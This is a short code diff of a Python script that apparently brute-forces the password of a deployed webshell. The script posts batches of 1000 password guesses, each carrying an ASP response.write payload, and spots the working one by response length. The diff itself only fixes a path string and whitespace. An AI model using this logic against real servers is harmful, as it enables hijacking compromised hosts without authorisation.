@@ -11,7 +11,7 @@ headers = {
 }
 pwd = []
 
-with open(".\poc\webshell\PW.txt", 'r')as p:
+with open(r".\poc\webshell\PW.txt", 'r')as p:
     pwd_list = p.readlines()
     dic = len(pwd_list) / 1000
     for pw in pwd_list:
@@ -42,7 +42,7 @@ def poc(url):
                 for i in range(0, int(dic) + 1):
                     for text in pwd[i * 1000:(i + 1) * 1000]:
                         post_data[text] = 'response.write("<|-password is %s-|>")' % text
-                    response = requests.post(url, data=post_data, headers=headers, timeout=Timeout, )
+                    response = requests.post(url, data=post_data, headers=headers, timeout=Timeout,)
                     post_data.clear()
                     time.sleep(1)
                     if len(response.text) != len(wrong_res):
